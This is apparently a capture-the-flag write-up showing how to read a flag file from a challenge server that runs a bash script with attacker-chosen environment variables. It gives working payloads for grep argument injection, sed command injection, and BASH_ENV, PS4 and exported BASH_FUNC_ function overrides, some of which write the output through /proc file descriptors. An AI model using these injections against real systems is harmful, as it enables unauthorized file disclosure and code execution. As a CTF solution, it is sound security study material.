The server greets us with
```
Hello! Send me a json array of [key, val, arg] lists and I will
execute `key=val bash script.sh arg' for each of them. You get
a flag when you have 10, 13, and 15 solutions with unique keys.
You may need to shutdown the input (send eof, -N in nc).
```

Let's address the elephant in the room first. Take a close look at this line
of the script:
```bash
    line="$(grep "${1:?Missing arg1: name}" < issues.txt)"
```

Looks like we can inject grep flags without any environment variables. After
a bit of fiddling, we discover that short options can take an argument without
a space: `-fflag`. This will search the input for the flag (read from the flag file).
We can also combine options. At this point, we see that `-rfflag` works locally,
as it searches the entire current directory for the contents of the `flag` file,
and finds it in the flag file.

However, when we send this to the server, it hits the timeout. This is not too
surprising, as we're searching through the entire filesystem. As an optimization,
we added the `-I` (ignore binaries) and `-F` (search for fixed string) flags.
This lets us get as many points as we need:
```
[
    ["bepis", "bepis", "-rIFflag"],
    ["bepiS", "bepis", "-rIFflag"],
    ["bepIs", "bepis", "-rIFflag"],
    ["bepIS", "bepis", "-rIFflag"],
    ["bePis", "bepis", "-rIFflag"],
    ["bePiS", "bepis", "-rIFflag"],
    ["bePIs", "bepis", "-rIFflag"],
    ["bePIS", "bepis", "-rIFflag"],
    ["bEpis", "bepis", "-rIFflag"],
    ["bEpiS", "bepis", "-rIFflag"],
    ["bEpIs", "bepis", "-rIFflag"],
    ["bEpIS", "bepis", "-rIFflag"],
    ["bEPis", "bepis", "-rIFflag"],
    ["bEPiS", "bepis", "-rIFflag"],
    ["bEPIs", "bepis", "-rIFflag"],
    ["bEPIS", "bepis", "-rIFflag"]
]
```

Unsurprisingly, this lead to the release of a patched challenge, "Regulated
Environmental Issues":
```diff
-    line="$(grep "${1:?Missing arg1: name}" < issues.txt)"
+    line="$(grep -- "${1:?Missing arg1: name}" < issues.txt)"
```

Let's look at the actual environment variables, then:

 - grep prepends `GREP_OPTIONS` to its arguments. When we set `GREP_OPTIONS=Flag`,
   we provide `Flag` as the search pattern, and the argument passed by the script
   turns into the path being searched.
   ```
   ["GREP_OPTIONS","Flag","flag"],
   ```
 - The script checks whether `USE_SED` is set. If so, we can inject sed commands.
   Let's terminate the search command, and then use the `r` command to read the
   flag file. Hide trailing characters with a comment.
   ```
   ["USE_SED","bepis","C/r flag\n#"],
   ```
 - `BASH_ENV` contains a path to a file that is sourced by bash when executing scripts
   (think `.bashrc`). `BASH_ENV=flag` makes bash print the flag to stderr, complaining
   that no such command exists.
   ```
   ["BASH_ENV","flag","bepis"],
   ```
 - `PS4` is the prompt used for tracing with `set -x`. It can contain variable
   and command expansions.
   ```
   ["PS4","`cat flag`","bepis"],
   ```
 - To progress further, we must learn that there is a way to export bash functions
   into the environment:
   ```
   ["BASH_FUNC_grep%%", "() { cat flag; }", "bepis"],
   ["BASH_FUNC_set%%",  "() { cat flag; }", "bepis"],
   ["BASH_FUNC_test%%", "() { cat flag; }", "bepis"],
   ["BASH_FUNC_echo%%", "() { cat flag; }", "bepis"],
   ["BASH_FUNC_bash%%", "() { cat flag; }", "bepis"],
   ```
 - Surprisingly, `return` is not a keyword and can be overwritten too:
   ```
   ["BASH_FUNC_return%%", "() { cat flag; }", "bepis"],
   ```
 - Let's also not forget about the commands executed by the subshell spawned by the
   `quiet` function:
   ```
   ["BASH_FUNC_eval%%", "() { cat flag; }", "bepis"],
   ["BASH_FUNC_exec%%", "() { cat flag; }", "bepis"],
   ```
 - `hash` is executed inside of `silent`, so printing the flag out of there
   is somewhat difficult. I chose to overwrite the `silent` function when `hash`
   is executed, and wait until it's used again at `silent imaginary`.
   ```
   ["BASH_FUNC_hash%%", "() { silent() { cat flag; }; return 1; }", "bepis"],
   ```
 - `cat` is even more problematic, as the entire shell in which it runs has no
   open file descriptors. We need to use procfs:
   ```
   ["BASH_FUNC_cat%%", "() { read flag < flag; echo $flag > /proc/$PPID/fd/1; }", "bepis"],
   ```
   (I am using `read` and `echo` instead of `cat` to avoid recursion. Just now, I have
   realized that `command cat` would also work.)
 - The last one is somewhat tricky, but that whole `imaginary` part of the script
   is makes you realize quite soon that you need to use the command not found hook
   that Ubuntu uses to tell you which apt package you need to install. A quick Google
   later, we obtain the final flag:
   ```
   ["BASH_FUNC_command_not_found_handle%%", "() { cat flag > /proc/$$/fd/1; }", "bepis"],
   ```

(Note that the above timeline is abridged. In reality, we realized how to exploit
the unintended grep issue after we already found 14 legitimate environment variables.)
